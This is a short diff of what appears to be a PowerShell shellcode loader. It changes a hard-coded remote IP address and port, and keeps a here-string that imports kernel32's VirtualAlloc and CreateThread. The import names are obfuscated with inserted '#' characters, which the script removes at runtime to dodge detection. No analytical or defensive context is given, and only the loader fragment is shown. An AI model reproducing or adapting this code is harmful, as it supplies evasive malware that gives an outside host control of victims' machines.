@@ -1,4 +1,4 @@
-$ip = "65.0.50.125"; $port = 22698; $c = @"
+$ip = "206.189.80.59"; $port = 22812; $c = @"
 [D#ll#Imp#ort("ker#ne#l32.#dll")] publi#c static e#xtern In#tPtr Virt#ualAl#loc(Int#Ptr w, ui#nt x, ui#nt y, ui#nt z);
 [Dl#lI##mpor#t("kern#el32.d#ll")] pub#lic st#atic ex#tern Int#Ptr Cr#eate#Thr#ead(Int#Ptr u, u#int v, IntP#tr w, Int#Ptr x, ui#nt y, IntPtr z);
 "@.replace("#", "")
